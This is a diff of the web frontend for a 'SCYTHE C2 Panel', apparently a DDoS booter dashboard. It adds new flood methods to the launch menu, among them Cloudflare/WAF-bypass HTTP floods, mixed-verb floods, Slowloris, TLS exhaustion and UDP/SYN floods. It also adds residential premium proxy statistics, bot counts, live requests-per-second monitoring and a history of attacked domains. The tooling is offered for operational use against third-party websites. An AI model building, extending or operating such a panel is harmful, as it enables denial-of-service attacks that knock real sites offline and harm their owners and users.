@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SCYTHE C2 Panel v5.3 - Sync Fixed</title>
+    <title>SCYTHE C2 Panel v1.0 - Premium Proxy + CF Bypass</title>
     <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
       :root {
@@ -12,6 +12,8 @@
         --neon-cyan: #00f3ff;
         --neon-red: #ff0040;
         --neon-yellow: #ffee00;
+        --neon-orange: #ff8800;
+        --neon-gold: #ffd700;
         --dark-bg: #0a0a0f;
         --darker-bg: #050508;
         --panel-bg: rgba(10, 10, 15, 0.85);
@@ -82,9 +84,11 @@
       .panel-header.purple { color: var(--neon-purple); border-bottom-color: rgba(176,38,255,0.2); }
       .panel-header.cyan { color: var(--neon-cyan); border-bottom-color: rgba(0,243,255,0.2); }
       .panel-header.red { color: var(--neon-red); border-bottom-color: rgba(255,0,64,0.2); }
+      .panel-header.gold { color: var(--neon-gold); border-bottom-color: rgba(255,215,0,0.2); }
       .badge { background: rgba(0,255,65,0.1); border: 1px solid var(--neon-green); padding: 4px 12px; border-radius: 4px; font-size: 12px; }
       .badge.purple { background: rgba(176,38,255,0.1); border-color: var(--neon-purple); color: var(--neon-purple); }
       .badge.red { background: rgba(255,0,64,0.1); border-color: var(--neon-red); color: var(--neon-red); }
+      .badge.gold { background: rgba(255,215,0,0.1); border-color: var(--neon-gold); color: var(--neon-gold); }
       .attack-form { display: grid; gap: 15px; }
       .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
       @media (max-width: 600px) { .form-row { grid-template-columns: 1fr; } }
@@ -124,9 +128,12 @@
         border-radius: 6px; padding: 20px; text-align: center;
       }
       .stat-card.purple { background: rgba(176,38,255,0.05); border-color: rgba(176,38,255,0.15); }
+      .stat-card.cyan { background: rgba(0,243,255,0.05); border-color: rgba(0,243,255,0.15); }
+      .stat-card.gold { background: rgba(255,215,0,0.05); border-color: rgba(255,215,0,0.15); }
       .stat-value { font-family: 'Orbitron', sans-serif; font-size: 32px; font-weight: 900; color: var(--neon-green); text-shadow: 0 0 15px rgba(0,255,65,0.3); }
       .stat-value.purple { color: var(--neon-purple); text-shadow: 0 0 15px rgba(176,38,255,0.3); }
       .stat-value.cyan { color: var(--neon-cyan); text-shadow: 0 0 15px rgba(0,243,255,0.3); }
+      .stat-value.gold { color: var(--neon-gold); text-shadow: 0 0 15px rgba(255,215,0,0.3); }
       .stat-value.red { color: var(--neon-red); text-shadow: 0 0 15px rgba(255,0,64,0.3); }
       .stat-label { font-size: 12px; color: rgba(0,255,65,0.6); text-transform: uppercase; }
       .attack-list { max-height: 400px; overflow-y: auto; }
@@ -146,8 +153,10 @@
       .attack-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
       .attack-id { font-family: 'Orbitron'; font-size: 13px; color: var(--neon-cyan); }
       .attack-method { background: rgba(176,38,255,0.1); border: 1px solid var(--neon-purple); color: var(--neon-purple); padding: 3px 10px; border-radius: 4px; font-size: 11px; text-transform: uppercase; }
+      .attack-method.nova { background: rgba(255,215,0,0.15); border-color: var(--neon-gold); color: var(--neon-gold); }
+      .attack-method.havoc { background: rgba(255,136,0,0.15); border-color: var(--neon-orange); color: var(--neon-orange); }
       .attack-target { font-size: 13px; color: rgba(0,255,65,0.7); margin-bottom: 8px; word-break: break-all; }
-      .attack-stats { display: flex; gap: 20px; font-size: 12px; color: rgba(0,255,65,0.5); }
+      .attack-stats { display: flex; gap: 20px; font-size: 12px; color: rgba(0,255,65,0.5); flex-wrap: wrap; }
       .attack-stats span { color: var(--neon-green); }
       .stop-btn { background: rgba(255,0,64,0.1); border: 1px solid var(--neon-red); color: var(--neon-red); padding: 5px 15px; border-radius: 4px; cursor: pointer; font-family: 'Share Tech Mono', monospace; font-size: 11px; text-transform: uppercase; transition: all 0.3s; }
       .stop-btn:hover { background: rgba(255,0,64,0.2); box-shadow: 0 0 10px rgba(255,0,64,0.3); }
@@ -166,6 +175,8 @@
       .history-compact tr:hover td { background: rgba(0,255,65,0.05); }
       .history-compact .domain { color: var(--neon-green); font-weight: bold; }
       .history-compact .method-badge { background: rgba(176,38,255,0.15); border: 1px solid var(--neon-purple); color: var(--neon-purple); padding: 2px 8px; border-radius: 4px; font-size: 10px; text-transform: uppercase; }
+      .history-compact .method-badge.nova { background: rgba(255,215,0,0.15); border-color: var(--neon-gold); color: var(--neon-gold); }
+      .history-compact .method-badge.havoc { background: rgba(255,136,0,0.15); border-color: var(--neon-orange); color: var(--neon-orange); }
       .history-compact .num { text-align: right; font-family: 'Orbitron', monospace; font-size: 12px; }
       .history-compact .num.cyan { color: var(--neon-cyan); }
       .history-compact .num.yellow { color: var(--neon-yellow); }
@@ -193,13 +204,29 @@
       .modal-close-btn { background: rgba(255,0,64,0.2); border: 1px solid var(--neon-red); color: var(--neon-red); padding: 10px 30px; border-radius: 6px; font-family: 'Share Tech Mono', monospace; font-size: 14px; cursor: pointer; transition: 0.3s; text-transform: uppercase; letter-spacing: 2px; }
       .modal-close-btn:hover { background: rgba(255,0,64,0.4); box-shadow: 0 0 20px rgba(255,0,64,0.3); }
       .modal-close-btn:active { transform: scale(0.95); }
+
+      /* Premium proxy stats */
+      .premium-stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 15px; }
+      .premium-card {
+        background: rgba(255,215,0,0.05); border: 1px solid rgba(255,215,0,0.15);
+        border-radius: 6px; padding: 15px; text-align: center;
+      }
+      .premium-card .value { font-family: 'Orbitron'; font-size: 24px; font-weight: 900; color: var(--neon-gold); text-shadow: 0 0 15px rgba(255,215,0,0.3); }
+      .premium-card .label { font-size: 11px; color: rgba(255,215,0,0.6); text-transform: uppercase; }
+      .premium-bar {
+        height: 4px; background: rgba(0,0,0,0.3); border-radius: 2px; overflow: hidden; margin-top: 8px;
+      }
+      .premium-bar-fill {
+        height: 100%; background: linear-gradient(90deg, var(--neon-gold), var(--neon-orange)); border-radius: 2px; transition: width 0.5s;
+      }
     </style>
-  </head>
+  <base target="_blank">
+</head>
   <body>
     <div class="bg-grid"></div>
     <div class="scanline"></div>
     <header class="header">
-      <div class="logo">SCYTHE <span>C2</span></div>
+      <div class="logo">SCYTHE <span>C2</span> <span style="font-size:14px;color:var(--neon-gold);">v1.0</span></div>
       <div style="display:flex;align-items:center;gap:10px;">
         <div class="status-dot"></div>
         <span>SYSTEM ONLINE</span>
@@ -229,13 +256,15 @@
               <label class="form-label">Method</label>
               <select class="form-select" id="method" required>
                 <option value="">Select Method...</option>
-                <optgroup label="Layer 7 - HTTP/HTTPS (6 GACOR)">
+                <optgroup label="Layer 7 - HTTP/HTTPS (8 GACOR)">
+                  <option value="titan">Titan – Ultra-High Rate + Go High-Performance</option>
+                  <option value="storm">Storm – Volume GET Flood + HTTP Storm</option>
+                  <option value="nova">NOVA – Cloudflare/WAF Bypass Specialist ⭐</option>
+                  <option value="havoc">HAVOC – Mixed GET/POST/PUT/DELETE Methods</option>
                   <option value="spectre">Spectre – WAF/CDN + Cloudflare Bypass</option>
                   <option value="vortex">Vortex – HTTP/2 Frame Injection + Connection Hold</option>
-                  <option value="titan">Titan – Ultra-High Rate + Go High-Performance</option>
                   <option value="phantom">Phantom – TLS + SSL Handshake Exhaustion</option>
                   <option value="serpent">Serpent – Slowloris + Connection Hold (Slow)</option>
-                  <option value="storm">Storm – Volume GET Flood + HTTP Storm</option>
                 </optgroup>
                 <optgroup label="Layer 4 - Network (4 GACOR)">
                   <option value="oblivion">Oblivion – Raw UDP + TCP SYN Flood</option>
@@ -276,6 +305,7 @@
           <button type="button" class="stopall-btn" id="stopAllBtn"> 🛑 STOP ALL ATTACKS </button>
         </form>
       </div>
+
       <div class="panel">
         <div class="panel-header green"> System Status <span class="badge" id="systemStatus">ONLINE</span></div>
         <div class="stats-grid">
@@ -285,32 +315,58 @@
           <div class="stat-card"><div class="stat-value" id="totalRequests">0</div><div class="stat-label">Total Requests</div></div>
         </div>
       </div>
+
       <div class="panel">
-        <div class="panel-header purple"> Proxy Pool <span class="badge purple" id="proxyBadge">AUTO</span></div>
+        <div class="panel-header gold"> 🏆 Premium Proxy (IPRoyal) <span class="badge gold">RESIDENTIAL</span></div>
+        <div class="premium-stats">
+          <div class="premium-card">
+            <div class="value" id="premiumSessions">0</div>
+            <div class="label">Active Sessions</div>
+            <div class="premium-bar"><div class="premium-bar-fill" id="premiumBar1" style="width:0%"></div></div>
+          </div>
+          <div class="premium-card">
+            <div class="value" id="premiumRequests">0</div>
+            <div class="label">Premium Req</div>
+            <div class="premium-bar"><div class="premium-bar-fill" id="premiumBar2" style="width:0%"></div></div>
+          </div>
+          <div class="premium-card">
+            <div class="value" id="premiumRatio">0%</div>
+            <div class="label">Traffic Ratio</div>
+            <div class="premium-bar"><div class="premium-bar-fill" id="premiumBar3" style="width:0%"></div></div>
+          </div>
+        </div>
         <div class="stats-grid">
           <div class="stat-card purple"><div class="stat-value purple" id="proxyCount">0</div><div class="stat-label">Alive Proxies</div></div>
           <div class="stat-card"><div class="stat-value cyan" id="proxyTotal">0</div><div class="stat-label">Total Fetched</div></div>
-          <div class="stat-card"><div class="stat-value" id="proxyRefresh">1s</div><div class="stat-label">Refresh Rate</div></div>
-          <div class="stat-card"><div class="stat-value" id="proxyStatus">ACTIVE</div><div class="stat-label">Status</div></div>
+          <div class="stat-card"><div class="stat-value" id="proxyFast">0</div><div class="stat-label">Fast Proxies</div></div>
+          <div class="stat-card"><div class="stat-value red" id="proxyDead">0</div><div class="stat-label">Dead Proxies</div></div>
         </div>
       </div>
+
       <div class="panel">
         <div class="panel-header cyan"> Live RPS Monitor <span class="badge purple">REAL-TIME</span></div>
         <div class="rps-counter" id="rpsCounter">0</div>
         <div class="graph-container"><div class="graph-line" id="rpsGraph"></div></div>
+        <div style="display:flex;justify-content:space-between;margin-top:10px;font-size:11px;color:rgba(0,255,65,0.5);">
+          <span id="botCount">Bots: 0</span>
+          <span id="proxyCountMini">Proxies: 0</span>
+          <span id="attackMethod">Method: -</span>
+        </div>
       </div>
+
       <div class="panel">
         <div class="panel-header purple"> 📜 Attack History (Last 5) <span class="badge purple">AVG RPS</span></div>
         <div class="history-compact" id="historyContainer"><div class="history-empty">No history yet.</div></div>
       </div>
+
       <div class="panel full-width">
-        <div class="panel-header green"> Ongoing Attacks <span class="badge" id="activeBadge">0/5</span></div>
+        <div class="panel-header green"> Ongoing Attacks <span class="badge" id="activeBadge">0</span></div>
         <div class="attack-list" id="attackList">
           <div class="empty-state"><p>No active attacks running</p><p style="font-size:11px;margin-top:5px;">Launch from web panel or terminal</p></div>
         </div>
       </div>
     </main>
-    <footer class="footer"> SCYTHE C2 Panel v5.3 | Dual Function | Max Hold: <span>86400s</span> | Max Concurrent: <span id="footerConcurrent">5</span> | Auto-Proxy: <span>1s refresh</span> | Sync: <span>Terminal + Web</span></footer>
+    <footer class="footer"> SCYTHE C2 Panel v1.0 | Premium Proxy | CF Bypass | Max Hold: <span>86400s</span> | Max Concurrent: <span id="footerConcurrent">5</span> | Auto-Proxy: <span>1s refresh</span> | Sync: <span>Terminal + Web + Premium</span></footer>
     <script>
       function updateClock() { document.getElementById('clock').textContent = new Date().toLocaleTimeString('en-US', { hour12: false }); }
       setInterval(updateClock, 1000); updateClock();
@@ -323,12 +379,64 @@
       });
       document.getElementById('modalCloseBtn').addEventListener('click', function() { document.getElementById('modalOverlay').classList.remove('active'); });
       document.getElementById('modalOverlay').addEventListener('click', function(e) { if (e.target === this) this.classList.remove('active'); });
+
+      // WebSocket for real-time updates
+      let ws = null;
+      let wsConnected = false;
+
+      function connectWebSocket() {
+        const wsUrl = `ws://${window.location.host}/admin/ws`;
+        ws = new WebSocket(wsUrl);
+        ws.onopen = function() {
+          wsConnected = true;
+          console.log('WebSocket connected');
+        };
+        ws.onmessage = function(event) {
+          try {
+            const msg = JSON.parse(event.data);
+            if (msg.type === 'attack_update' && msg.data) {
+              handleAttackUpdate(msg.data);
+            } else if (msg.type === 'periodic_update' && msg.data) {
+              handlePeriodicUpdate(msg.data);
+            }
+          } catch (e) {}
+        };
+        ws.onclose = function() {
+          wsConnected = false;
+          setTimeout(connectWebSocket, 5000);
+        };
+        ws.onerror = function() {};
+      }
+
+      function handleAttackUpdate(data) {
+        if (data.event === 'attack_started' || data.event === 'attack_progress') {
+          loadActiveAttacks();
+        } else if (data.event === 'attack_stopped' || data.event === 'attack_completed') {
+          loadActiveAttacks();
+        }
+      }
+
+      function handlePeriodicUpdate(data) {
+        if (data.proxy) {
+          document.getElementById('proxyCount').textContent = (data.proxy.alive || 0).toLocaleString();
+        }
+        if (data.bots) {
+          document.getElementById('botCount').textContent = 'Bots: ' + (data.bots.active || 0);
+        }
+      }
+
       let eventSource;
       function connectSSE() {
         eventSource = new EventSource('/api/stream');
-        eventSource.onmessage = function(event) { try { const data = JSON.parse(event.data); updateDashboard(data); } catch (e) {} };
+        eventSource.onmessage = function(event) {
+          try {
+            const data = JSON.parse(event.data);
+            updateDashboard(data);
+          } catch (e) {}
+        };
         eventSource.onerror = function() { setTimeout(connectSSE, 5000); };
       }
+
       function renderActiveAttacks(active) {
         const container = document.getElementById('attackList');
         if (!container) { console.error("attackList container not found!"); return; }
@@ -345,21 +453,68 @@
             const holdRemaining = Math.max(0, hold_time - elapsed);
             const progress = Math.min(100, (elapsed / duration) * 100);
             const holdProgress = Math.min(100, (elapsed / hold_time) * 100);
-            return `<div class="attack-item"><div class="attack-header"><span class="attack-id">${id.substring(0, 20)}...</span><div style="display:flex;gap:10px;align-items:center;"><span class="attack-method">${method}</span><button class="stop-btn" onclick="stopAttack('${id}')">STOP</button></div></div><div class="attack-target">${target}</div><div class="attack-stats"><span>RPS: ${rps}</span><span>Req: ${total_requests.toLocaleString()}</span><span>Proxy: ${proxy_count.toLocaleString()}</span><span>Duration: ${elapsed}s / ${duration}s</span><span>Hold: ${holdRemaining}s</span></div><div class="progress-container"><div class="progress-bar" style="width: ${holdProgress}%"></div></div><div class="progress-text">Attack: ${progress.toFixed(1)}% | Hold: ${holdProgress.toFixed(1)}% | ${holdRemaining}s remaining</div></div>`;
+            const methodClass = method.toLowerCase() === 'nova' ? 'nova' : method.toLowerCase() === 'havoc' ? 'havoc' : '';
+            return `<div class="attack-item"><div class="attack-header"><span class="attack-id">${id.substring(0, 20)}...</span><div style="display:flex;gap:10px;align-items:center;"><span class="attack-method ${methodClass}">${method}</span><button class="stop-btn" onclick="stopAttack('${id}')">STOP</button></div></div><div class="attack-target">${target}</div><div class="attack-stats"><span>RPS: ${rps.toLocaleString()}</span><span>Req: ${total_requests.toLocaleString()}</span><span>Proxy: ${proxy_count.toLocaleString()}</span><span>Duration: ${elapsed}s / ${duration}s</span><span>Hold: ${holdRemaining}s</span></div><div class="progress-container"><div class="progress-bar" style="width: ${holdProgress}%"></div></div><div class="progress-text">Attack: ${progress.toFixed(1)}% | Hold: ${holdProgress.toFixed(1)}% | ${holdRemaining}s remaining</div></div>`;
           }).join('');
         } catch (e) { console.error("Error rendering attacks:", e); }
       }
+
       function renderHistory(history) {
         const container = document.getElementById('historyContainer');
         if (!history || history.length === 0) { container.innerHTML = `<div class="history-empty">No history yet.</div>`; return; }
         const items = history.slice(0, 5);
         let html = `<table><thead><tr><th>Domain</th><th>Method</th><th style="text-align:right;">Avg RPS</th><th style="text-align:right;">Req</th><th style="text-align:right;">Dur</th></tr></thead><tbody>`;
-        items.forEach(h => { html += `<tr><td class="domain">${h.domain}</td><td><span class="method-badge">${h.method}</span></td><td class="num cyan">${h.avg_rps.toLocaleString()}</td><td class="num yellow">${h.total_requests.toLocaleString()}</td><td class="num green">${h.duration}s</td></tr>`; });
+        items.forEach(h => { 
+          const methodClass = h.method.toLowerCase() === 'nova' ? 'nova' : h.method.toLowerCase() === 'havoc' ? 'havoc' : '';
+          html += `<tr><td class="domain">${h.domain}</td><td><span class="method-badge ${methodClass}">${h.method}</span></td><td class="num cyan">${(h.avg_rps || 0).toLocaleString()}</td><td class="num yellow">${(h.total_requests || 0).toLocaleString()}</td><td class="num green">${h.duration}s</td></tr>`; 
+        });
         html += `</tbody></table>`;
         container.innerHTML = html;
       }
-      async function fetchConcurrent() { try { const res = await fetch('/api/config/concurrent'); if (!res.ok) return; const data = await res.json(); const val = data.max_concurrent || 5; document.getElementById('maxConcurrent').textContent = val; document.getElementById('footerConcurrent').textContent = val; } catch (e) {} }
-      async function fetchProxyStats() { try { const res = await fetch('/api/proxy/stats'); if (!res.ok) return; const data = await res.json(); document.getElementById('proxyCount').textContent = (data.alive || 0).toLocaleString(); document.getElementById('proxyTotal').textContent = (data.total || 0).toLocaleString(); } catch (e) {} }
+
+      async function fetchConcurrent() { 
+        try { 
+          const res = await fetch('/api/config/concurrent'); 
+          if (!res.ok) return; 
+          const data = await res.json(); 
+          const val = data.max_concurrent || 5; 
+          document.getElementById('maxConcurrent').textContent = val; 
+          document.getElementById('footerConcurrent').textContent = val; 
+        } catch (e) {} 
+      }
+
+      async function fetchProxyStats() { 
+        try { 
+          const res = await fetch('/api/proxy/stats'); 
+          if (!res.ok) return; 
+          const data = await res.json(); 
+          document.getElementById('proxyCount').textContent = (data.alive || 0).toLocaleString();
+          document.getElementById('proxyTotal').textContent = (data.total || 0).toLocaleString();
+          document.getElementById('proxyFast').textContent = (data.fast || 0).toLocaleString();
+          document.getElementById('proxyDead').textContent = (data.dead || 0).toLocaleString();
+          document.getElementById('proxyCountMini').textContent = 'Proxies: ' + (data.alive || 0);
+        } catch (e) {} 
+      }
+
+      // FIX: Fetch premium proxy stats from /api/proxy/monitor
+      async function fetchPremiumStats() {
+        try {
+          const res = await fetch('/api/proxy/monitor');
+          if (!res.ok) return;
+          const data = await res.json();
+          if (data.success && data.health) {
+            const health = data.health;
+            document.getElementById('premiumSessions').textContent = (health.premium_active_sessions || 0).toLocaleString();
+            document.getElementById('premiumRequests').textContent = (health.premium_total_requests || 0).toLocaleString();
+            const ratio = Math.round((health.premium_ratio || 0) * 100);
+            document.getElementById('premiumRatio').textContent = ratio + '%';
+            document.getElementById('premiumBar1').style.width = Math.min(100, (health.premium_active_sessions || 0) * 2) + '%';
+            document.getElementById('premiumBar2').style.width = Math.min(100, ratio) + '%';
+            document.getElementById('premiumBar3').style.width = ratio + '%';
+          }
+        } catch (e) {}
+      }
+
       function updateDashboard(data) {
         const active = data.active_attacks || [];
         document.getElementById('activeCount').textContent = active.length;
@@ -371,8 +526,37 @@
         document.getElementById('rpsCounter').textContent = totalRps.toLocaleString();
         document.getElementById('proxyStatus').textContent = data.proxy_refreshing ? 'REFRESHING' : 'ACTIVE';
         if (data.history) renderHistory(data.history);
+
+        // Update attack method display
+        if (active.length > 0) {
+          document.getElementById('attackMethod').textContent = 'Method: ' + active[0].method;
+        } else {
+          document.getElementById('attackMethod').textContent = 'Method: -';
+        }
       }
-      async function fetchHistory() { try { const res = await fetch('/api/history'); if (!res.ok) return; const data = await res.json(); if (data.history) renderHistory(data.history); } catch (e) {} }
+
+      async function fetchHistory() { 
+        try { 
+          const res = await fetch('/api/history'); 
+          if (!res.ok) return; 
+          const data = await res.json(); 
+          if (data.history) renderHistory(data.history); 
+        } catch (e) {} 
+      }
+
+      async function loadActiveAttacks() {
+        try {
+          const res = await fetch('/api/attack/active');
+          if (!res.ok) return;
+          const data = await res.json();
+          if (data.attacks) {
+            renderActiveAttacks(data.attacks);
+            document.getElementById('activeCount').textContent = data.attacks.length;
+            document.getElementById('activeBadge').textContent = `${data.attacks.length}/5`;
+          }
+        } catch (e) {}
+      }
+
       document.getElementById('attackForm').addEventListener('submit', async function(e) {
         e.preventDefault();
         const method = document.getElementById('method').value, target = document.getElementById('target').value;
@@ -388,6 +572,7 @@
         } catch (error) { showAlert('Network error: ' + error.message, 'error'); }
         btn.disabled = false; btn.textContent = '⚔️ LAUNCH ATTACK';
       });
+
       async function stopAttack(attackId) {
         try {
           const response = await fetch(`/api/stop/${attackId}`, { method: 'POST' });
@@ -396,6 +581,7 @@
           else { showAlert('Failed to stop attack: ' + (result.detail || result.message), 'error'); }
         } catch (error) { showAlert('Failed to stop attack: ' + error.message, 'error'); }
       }
+
       document.getElementById('stopAllBtn').addEventListener('click', async function() {
         if (!confirm('Stop ALL active attacks?')) return;
         try {
@@ -405,12 +591,22 @@
           else { showAlert('Failed to stop all attacks: ' + (result.detail || result.message), 'error'); }
         } catch (error) { showAlert('Error: ' + error.message, 'error'); }
       });
+
+      // Init
       fetch('/api/status').then(r => r.json()).then(data => { updateDashboard(data); if (!data.history) fetchHistory(); }).catch(() => {});
       connectSSE();
+      connectWebSocket();
+      fetchConcurrent(); 
+      fetchProxyStats();
+      fetchPremiumStats();
+      loadActiveAttacks();
+
       setInterval(() => { fetch('/api/status').then(r => r.json()).then(data => { updateDashboard(data); if (!data.history) fetchHistory(); }).catch(() => {}); }, 5000);
       setInterval(fetchHistory, 10000);
-      fetchConcurrent(); fetchProxyStats();
-      setInterval(fetchConcurrent, 15000); setInterval(fetchProxyStats, 15000);
+      setInterval(fetchConcurrent, 15000);
+      setInterval(fetchProxyStats, 15000);
+      setInterval(fetchPremiumStats, 15000);
+      setInterval(loadActiveAttacks, 5000);
     </script>
   </body>
 </html>
